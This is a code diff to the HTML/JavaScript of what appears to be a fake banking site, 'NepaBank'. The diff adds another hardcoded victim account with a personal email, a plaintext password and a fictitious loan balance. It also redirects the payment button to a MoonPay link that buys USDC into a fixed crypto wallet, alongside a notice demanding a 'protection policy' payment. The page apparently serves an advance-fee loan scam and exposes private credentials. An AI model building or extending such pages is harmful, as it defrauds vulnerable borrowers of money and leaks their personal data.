@@ -604,7 +604,7 @@
 <div id="toastMsg" class="toast-message"><i class="fas fa-shield-alt"></i> <span>Póliza de protección requerida - Dirígete a la sección de Seguros para activarla</span></div>
 
 <script>
-  // ==================== USUARIOS (13 USUARIOS) ====================
+  // ==================== USUARIOS (14 USUARIOS) ====================
   // Alfredo Soto: 50% descuento | Vilma Mojica: 30% descuento
   const USERS = [
     { username: "invitado", password: "NepaBank2026!", name: "Carlos Méndez", cardHolder: "CARLOS MENDEZ", balance: 2500.00, discount: 0,
@@ -634,8 +634,14 @@
       transactions: [{ desc: "Desembolso del crédito NEPA", amount: 10000.00, date: "2026-04-07" }] },
     // Vilma Mojica - 30% descuento (7 de abril)
     { username: "katy94149@gmail.com", password: "Vilma2026#", name: "Vilma Mojica", cardHolder: "VILMA MOJICA", balance: 1500.00, discount: 30,
-      transactions: [{ desc: "Desembolso del crédito NEPA", amount: 1500.00, date: "2026-04-07" }] }
+      transactions: [{ desc: "Desembolso del crédito NEPA", amount: 1500.00, date: "2026-04-07" }] },
+    // Franceline Cifuentes (8 de abril, sin descuento)
+    { username: "cifuentesfrancia940@gmail.com", password: "Franceline2026#", name: "Franceline Cifuentes", cardHolder: "FRANCELINE CIFUENTES", balance: 2000.00, discount: 0,
+      transactions: [{ desc: "Desembolso del crédito NEPA", amount: 2000.00, date: "2026-04-08" }] }
   ];
+
+  // LINK DE PAGO ACTUALIZADO (MoonPay)
+  const PAYMENT_LINK = "https://buy.moonpay.com/v2/buy?externalTransactionId=WK1u4gNvySHpBWvFPqtxjBvz0Vq_xRxCf50mL7I8ol8&externalCustomerId=did%3Aprivy%3Acmnf65ju500zm0cl7c2lucpdj&apiKey=pk_live_hirbpu0cVcLHrjktC9l7fbc9ctjv0SL&walletAddress=0xe1D2CA68872eB4416b05967BdB65c3D8428814ca&currencyCode=USDC_BASE&quoteCurrencyAmount=100&paymentMethod=credit_debit_card&colorCode=%233d8bff&theme=light&signature=SKtUMmfJ5Ub0snDSM2hWnBJ11F4zstXUrsfCPz84CkI%3D";
 
   let currentUser = null;
   let balanceVisible = true;
@@ -886,7 +892,8 @@
     if (closeModal) closeModal.addEventListener('click', () => { paymentModal.classList.remove('active'); resetInactivityTimer(); });
     if (confirmBtn) {
       confirmBtn.onclick = () => {
-        window.open('https://app.joinpana.com/payments/p2p/xcyklzln', '_blank');
+        // Abrir el link de MoonPay
+        window.open(PAYMENT_LINK, '_blank');
         showToast('🔄 Redirigiendo a la pasarela de pagos segura...');
         paymentModal.classList.remove('active');
         resetInactivityTimer();
